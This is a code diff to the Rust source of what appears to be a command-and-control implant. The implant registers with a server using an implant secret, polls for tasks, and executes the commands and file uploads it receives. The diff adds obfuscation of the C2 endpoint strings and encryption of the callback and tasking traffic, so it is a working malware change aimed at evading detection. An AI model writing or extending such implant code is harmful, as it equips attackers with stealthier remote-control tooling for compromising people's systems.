@@ -3,6 +3,8 @@ use link_common::{
     get_sleep_seconds, should_exit, sleep, sleep_with_jitter, CallbackRequest, RegisterRequest,
     TaskResponse,
 };
+use obfstr::obfstr;
+use serde::Serialize;
 use std::env;
 use std::process::Command;
 
@@ -44,7 +46,11 @@ pub fn link_loop() {
 
     // Stage 1: establish session cookie
     loop {
-        if client.get(format!("{}/js", base)).send().is_ok() {
+        if client
+            .get(format!("{}{}", base, obfstr!("/js")))
+            .send()
+            .is_ok()
+        {
             break;
         }
         if should_exit() {
@@ -65,7 +71,7 @@ pub fn link_loop() {
 
     let mut x_req_id = loop {
         if let Ok(r) = client
-            .post(format!("{}/static/register", base))
+            .post(format!("{}{}", base, obfstr!("/static/register")))
             .header("X-Client-ID", IMPLANT_SECRET)
             .json(&reg)
             .send()
@@ -86,13 +92,29 @@ pub fn link_loop() {
             break;
         }
 
+        // Build encrypted payload for callback
+        #[derive(Serialize)]
+        struct CallbackPayload {
+            q: String,
+            tasking: String,
+        }
+
+        let payload = CallbackPayload {
+            q: prev_output.clone(),
+            tasking: prev_task_id.clone(),
+        };
+        let payload_json = serde_json::to_string(&payload).unwrap_or_else(|_| "{}".to_string());
+        let encrypted_data = link_common::encrypt_payload(&payload_json, &encryption_key);
+        let encrypted_data_str: &str = &encrypted_data;
+
         let cb = CallbackRequest {
-            q: &prev_output,
-            tasking: &prev_task_id,
+            data: Some(encrypted_data_str),
+            q: "",
+            tasking: "",
         };
 
         match client
-            .post(format!("{}/static/get", base))
+            .post(format!("{}{}", base, obfstr!("/static/get")))
             .header("x-request-id", &x_req_id)
             .json(&cb)
             .send()
@@ -100,23 +122,65 @@ pub fn link_loop() {
         {
             Ok(task) => {
                 x_req_id = task.x_request_id.clone();
-                if task.q.is_empty() {
-                    prev_output = String::new();
-                    prev_task_id = String::new();
-                } else if task.q == "exit" {
-                    break;
-                } else {
-                    let effective_cmd = if task.q.starts_with("upload ") {
-                        if let (Some(content), Some(path)) = (&task.upload, &task.upload_path) {
-                            format!("upload {} {}", content, path)
+
+                // Decrypt the response payload
+                let decrypted_task: TaskResponse;
+                if let Some(encrypted_data) = task.data {
+                    if let Some(decrypted_json) =
+                        link_common::decrypt_payload(&encrypted_data, &encryption_key)
+                    {
+                        if let Ok(decrypted) = serde_json::from_str::<TaskResponse>(&decrypted_json)
+                        {
+                            decrypted_task = decrypted;
                         } else {
-                            task.q.clone()
+                            // Fallback to empty task if decryption fails
+                            decrypted_task = TaskResponse {
+                                data: None,
+                                x_request_id: task.x_request_id,
+                                q: String::new(),
+                                tasking: String::new(),
+                                file: None,
+                                filename: None,
+                                upload: None,
+                                upload_path: None,
+                            };
                         }
                     } else {
-                        task.q.clone()
+                        decrypted_task = TaskResponse {
+                            data: None,
+                            x_request_id: task.x_request_id,
+                            q: String::new(),
+                            tasking: String::new(),
+                            file: None,
+                            filename: None,
+                            upload: None,
+                            upload_path: None,
+                        };
+                    }
+                } else {
+                    // Legacy format fallback
+                    decrypted_task = task;
+                }
+
+                if decrypted_task.q.is_empty() {
+                    prev_output = String::new();
+                    prev_task_id = String::new();
+                } else if decrypted_task.q == "exit" {
+                    break;
+                } else {
+                    let effective_cmd = if decrypted_task.q.starts_with("upload ") {
+                        if let (Some(content), Some(path)) =
+                            (&decrypted_task.upload, &decrypted_task.upload_path)
+                        {
+                            format!("upload {} {}", content, path)
+                        } else {
+                            decrypted_task.q.clone()
+                        }
+                    } else {
+                        decrypted_task.q.clone()
                     };
                     prev_output = dispatch(&effective_cmd);
-                    prev_task_id = task.tasking.clone();
+                    prev_task_id = decrypted_task.tasking.clone();
                 }
             }
             Err(_) => {
